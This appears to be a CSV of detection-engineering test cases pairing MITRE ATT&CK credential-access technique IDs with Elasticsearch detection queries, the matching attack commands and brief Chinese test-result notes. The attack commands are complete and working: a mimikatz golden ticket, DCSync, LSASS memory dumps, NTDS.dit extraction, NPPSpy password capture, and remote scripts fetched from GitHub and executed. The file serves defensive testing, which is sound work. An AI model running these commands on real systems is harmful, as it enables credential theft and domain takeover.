T1558.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Security.Principal.NTAccount""}},
                        {""match_phrase"": {""CommandLine"": ""mimikatz.exe""}},
                        {""wildcard"": {""CommandLine"": ""*.txt""}},
                        {""match_phrase"": {""CommandLine"": ""klist purge""}},
                        {""match_phrase"": {""CommandLine"": ""Get-Content -Path""}},
                        {""match_phrase"": {""CommandLine"": ""ForEach-Object""}},
                        {""match_phrase"": {""CommandLine"": ""Out-File""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""*userdnsdomain*""}},
                        {""match_phrase"": {""CommandLine"": ""Remove-Item""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore; 
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore; 
$domain_sid = ""S-1-5-21-DEFAULT""; 
If ($domain_sid -Match ""DEFAULT"") {;
   $domain = gwmi Win32_ComputerSystem | Select -Expand Domain;
   $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value;
   $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'));
}; 
@""; >%TEMP%\golden.txt 2>&1 (;
   echo Purge existing tickets and create golden ticket:;
   klist purge;
   $env:TEMP\mimikatz\x64\mimikatz.exe ""kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:goldenticketfakeuser /ptt"" ""exit"";
   echo.;
   echo Requesting SYSVOL:;
   dir \\%userdnsdomain%\SYSVOL;   ;
   echo.;
   echo Tickets after requesting SYSVOL:;
   klist;
   echo.;
   echo End of Golden Ticket attack; 
); ""
@ -Replace ""DOMAIN_SID"", $domain_sid | Out-File -Encoding OEM $env:TEMP\golden.bat; 
echo ""foo"" | runas /netonly /user:fake ""$env:TEMP\golden.bat"" | Out-Null; 
do {;
   Start-Sleep 1;
   Get-Content -Path ""$env:TEMP\golden.txt"" -Wait | ForEach-Object {;
     if ($_ -match 'End of Golden Ticket attack') { break } ;
   }; 
} while ($false); 
Get-Content $env:TEMP\golden.txt; 
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore; 
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore",2,
T1003.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""wildcard"": {""CommandLine"": ""procdump*""}},
                    {""match_phrase"": {""CommandLine"": ""lsass.exe""}},
                    {""wildcard"": {""CommandLine"": ""*.dmp""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","PathToAtomicsFolder\T1003.001\bin\procdump.exe -accepteula -mm lsass.exe C:\Windows\Temp\lsass_dump.dmp

PathToAtomicsFolder\T1003.001\bin\procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp",没日志,
T1003.003,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                    {""wildcard"": {""CommandLine"": ""vssadmin*""}},
                    {""match_phrase"": {""CommandLine"": ""create shadow""}},
                    {""wildcard"": {""CommandLine"": ""mklink*""}}
            ],
            ""minimum_should_match"": 2
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","vssadmin.exe create shadow /for=C: 
&& mklink /D C:\Temp\vssstore \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

(Available only for Win7)",2,
T1003.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""wildcard"": {""CommandLine"": ""wmic*""}},
                    {""match_phrase"": {""CommandLine"": ""process call create""}},
                    {""wildcard"": {""CommandLine"": ""esentutl*""}},
                    {""wildcard"": {""CommandLine"": ""*ntds.dit""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","wmic /node:""localhost"" process call create ""cmd.exe /c esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\ntds.dit""",2（被53识别）,
T1003.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""wildcard"": {""CommandLine"": ""wmic*""}},
                    {""match_phrase"": {""CommandLine"": ""shadowcopy call create""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","wmic /node:""localhost"" shadowcopy call create Volume=C:\

wmic shadowcopy call create Volume=C:\",2(被53识别）,
T1003,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""NPPSPY.dll""}},
                        {""match_phrase"": {""CommandLine"": ""Get-ItemProperty -Path""}},
                        {""match_phrase"": {""CommandLine"": ""Control\\NetworkProvider\\Order""}},
                        {""match_phrase"": {""CommandLine"": ""Set-ItemProperty -Path""}},
                        {""match_phrase"": {""CommandLine"": ""New-Item -Path""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""Copy-Item""}},
                        {""match_phrase"": {""CommandLine"": ""-PropertyType ExpandString""}},
                        {""match_phrase"": {""CommandLine"": ""CurrentControlSet\\Services\\NPPSpy""}}
      ],
            ""minimum_should_match"": 2
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Copy-Item ""$env:Temp\NPPSPY.dll"" -Destination ""C:\Windows\System32""; 
$path = Get-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order"" -Name PROVIDERORDER; 
$UpdatedValue = $Path.PROVIDERORDER + "",NPPSpy""; 
Set-ItemProperty -Path $Path.PSPath -Name ""PROVIDERORDER"" -Value $UpdatedValue; 
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore; 
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore; 
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name ""Class"" -Value 2 -ErrorAction Ignore; 
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name ""Name"" -Value NPPSpy -ErrorAction Ignore; 
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name ""ProviderPath"" -PropertyType ExpandString -Value ""%SystemRoot%\System32\NPPSPY.dll"" -ErrorAction Ignore; 
echo ""[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt""",2,
T1552.002,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""reg*""}},
                          {""wildcard"": {""CommandLine"": ""REG_SZ""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""query HKCU""}},
                        {""match_phrase"": {""CommandLine"": ""query HKLM""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","reg query HKCU /f password /t REG_SZ /s

reg query HKLM /f password /t REG_SZ /s
  
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s",2,
T1003.006,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""mimikatz*""}},
                        {""wildcard"": {""CommandLine"": ""lsadump*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""domain*""}},
                        {""wildcard"": {""CommandLine"": ""user*""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","%tmp%\mimikatz\x64\mimikatz.exe ""lsadump::dcsync /domain:%userdnsdomain% /user:krbtgt@%userdnsdomain%"" ""exit""",2,
T1003.003,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""ntdsutil*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""ac i ntds""}},
                        {""match_phrase"": {""CommandLine"": ""\""ifm\""""}},
                        {""match_phrase"": {""CommandLine"": ""create full""}},
                        {""wildcard"": {""CommandLine"": ""snapshot*""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","mkdir C:\Windows\Temp\ntds_T1003 
&& ntdsutil ""ac i ntds"" ""ifm"" ""create full C:\Windows\Temp\ntds_T1003"" q q",2,
T1003.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""wildcard"": {""CommandLine"": ""createdump*""}},
                    {""match_phrase"": {""CommandLine"": ""tasklist | findstr""}},
                    {""wildcard"": {""CommandLine"": ""lsass*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","echo ""Createdump Path C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.*.*\createdump.exe""; $LSASS = tasklist | findstr ""lsass""; 
$FIELDS = $LSASS -split ""\s+""; 
$ID = $FIELDS[1]; 
& ""C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.*.*\createdump.exe"" -u -f C:\Windows\Temp\dotnet-lsass.dmp $ID",2,
T1003.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""*.dmp""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""nanodump*""}},
                        {""wildcard"": {""CommandLine"": ""xordump*""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","%temp%\nanodump.x64.exe -w ""%temp%\nanodump.dmp""

if (Test-Path 'C:\Windows\Temp\xordump.exe') { ;
 } else {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
Invoke-WebRequest ""https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe"" -OutFile C:\Windows\Temp\xordump.exe};  ;  
C:\Windows\Temp\xordump.exe -out C:\Windows\Temp\lsass-xordump.t1003.001.dmp -x 0x41",2,
T1003.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""get-process lsass""}},
                        {""match"": {""CommandLine"": ""MiniDump""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""*.ps1""}},
                        {""wildcard"": {""CommandLine"": ""*.dll""}},
                        {""wildcard"": {""CommandLine"": ""*.exe""}},
                        {""wildcard"": {""CommandLine"": ""*.dmp""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); 
get-process lsass | Out-Minidump

C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full",没日志（被拦截疑）,
T1003.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"": {""CommandLine"": ""Outflank-Dumpert.exe""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",PathToAtomicsFolder\T1003.001\bin\Outflank-Dumpert.exe,2,
T1555,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                    {""match_phrase"": {""CommandLine"": ""Get-CredManCreds""}},
                    {""match_phrase"": {""CommandLine"": ""Get-PasswordVaultCredentials""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); 
Get-CredManCreds -Force

IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force",2,
T1003,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Get-NetTCPConnection -LocalPort""}},
                        {""wildcard"": {""CommandLine"": ""*.dmp""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""Get-Process svchost""}},
                        {""wildcard"": {""CommandLine"": ""*.OwningProcess""}},
                        {""wildcard"": {""CommandLine"": ""*dump*""}},
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore); 
if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }; C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full",2,
T1003.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""wildcard"": {""CommandLine"": ""PsExec*""}},
                    {""match_phrase"": {""CommandLine"": ""reg save""}},
                    {""match_phrase"": {""CommandLine"": ""security\\policy\\secrets""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",PathToAtomicsFolder\T1003.004\bin\PsExec.exe -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets /y,2(被45识别),
T1558.003,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""match_phrase"": {""CommandLine"": ""System.IdentityModel""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                         {""match"": {""CommandLine"": ""-T""}},
                        {""match"": {""CommandLine"": ""-Q""}}
      ]
     }
    } ,
        {""bool"":{
          ""must"":[
                        {""wildcard"":{""CommandLine"": ""setspn*""}}
                    ]
     }
    },
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",setspn -T %USERDNSDOMAIN% -Q */*,2,
T1552.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match"":{""CommandLine"": ""findstr""}},
                        {""match_phrase"": {""CommandLine"": ""select-string""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"":{""CommandLine"": ""pass*""}},        
                        {""wildcard"": {""CommandLine"": ""*.xml""}},
                        {""wildcard"": {""CommandLine"": ""*.doc""}},
                        {""wildcard"": {""CommandLine"": ""*.txt""}},
                        {""wildcard"": {""CommandLine"": ""*.xls""}}
      ],
       ""minimum_should_match"": 1
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","findstr /si pass *.xml *.doc *.txt *.xls; 
ls -R | select-string -Pattern password",,
